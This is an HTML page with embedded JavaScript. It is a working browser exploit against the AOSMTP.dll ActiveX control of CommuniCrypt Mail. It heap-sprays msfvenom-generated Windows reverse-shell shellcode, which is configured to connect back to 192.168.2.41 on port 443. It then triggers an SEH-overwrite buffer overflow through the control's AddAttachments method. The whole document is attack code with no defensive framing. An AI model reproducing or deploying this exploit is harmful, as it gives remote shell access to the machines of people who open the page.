<html>
<!-- Load the AOSMTP Mail Object -->
<object classid='clsid:F8D07B72-B4B4-46A0-ACC0-C771D4614B82' id='target' ></object>

<script>
//Exploit for CommuniCrypt Mail in AOSMTP.dll
//msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp EXITFUN=seh -b '\x00' -f js_le LHOST=192.168.2.41 LPORT=443
//Payload Size: 351 Bytes
shellcode = unescape('%u26b8%u1284%udb4f%ud9cc%u2474%u5ff4%uc933%u52b1%uef83%u31fc%u0e47%u6103%uf08a%u91ba%u767a%u6944%u177b%u8ccc%u174a%uc5aa%ua7fd%u8bb8%u4cf1%u3fec%u2181%u3039%u8f22%u7f1f%ubcb3%u1e5c%ubf37%uc0b0%u7006%u01c5%u6d4e%u5324%uf907%u439b%ub72c%ue827%u597e%u0d20%u5836%u8001%u034c%u2381%u3f80%u3b88%u7ac5%ub042%uf03d%u1055%uf90c%u5dfa%u08a0%u9a02%uf307%ud271%u8e7b%u2181%u5401%ub107%u1fa1%u1dbf%uf353%ud626%ub85f%ub02d%u3f43%ucbe1%ub478%u1b04%u8e09%ubf22%u5451%ue64a%u3b3f%uf873%ue49f%u73d1%uf00d%ude6b%u355a%ue046%u519a%u93d1%ufea8%u3b49%u7781%ubc54%uade6%u5220%u4e19%u7b51%u1ade%u1301%u22f7%ue3ca%uf6f8%ub35d%ua956%u631d%u1917%u69f6%u4698%u92e6%uef72%u698d%ud015%u73fa%ub8cc%u73f8%u820f%u9574%ue465%u0ed0%u9d12%uc478%u6283%ua157%ue984%u5654%u1a4a%u4410%uea3b%u366f%uf5ea%u5e45%u6770%u9e02%u94ff%uc99d%u6ba8%u9fd4%ud544%ubd4e%u8394%u05a9%u7043%u8437%ucc06%u9613%ucdde%uc21f%u9b8e%ubcc9%u7268%u16b8%u2923%ufe12%u01b2%u78a5%u4fbb%u6453%u260a%u9b22%uaea3%ue4a2%u4ed9%u3f4c%u7e5a%u1d07%u17cb%uf4ce%u7a49%u23f1%u838d%uc172%u706e%ua06a%u3c6b%u592c%u2d06%u5dd9%u4eb5%u41c8');
nops = unescape('%u9090%u9090');
headersize = 20;

// create one block with nops
slackspace = headersize + shellcode.length;
while(nops.length < slackspace) nops += nops;
fillblock= nops.substring(0, slackspace);

//enlarge block with nops, size 0x50000
block= nops.substring(0, nops.length - slackspace);
while(block.length+slackspace < 0x50000) block= block+ block+ fillblock;

//spray 250 times : nops + shellcode
memory=new Array();
for( counter=0; counter<250; counter++) memory[counter]= block + shellcode;


var buffer = '';
while(buffer.length < 272) buffer+="C";

ret = "\xff\xff\xff\xff";
junk2 = "BBBBBBBB";
nseh = "AAAA";
seh = "\x06\x06\x06\x06";

alert('Payload Will Execute!')
payload = buffer + ret  + junk2 + nseh + seh;

target.AddAttachments(payload);

</script>
</html>
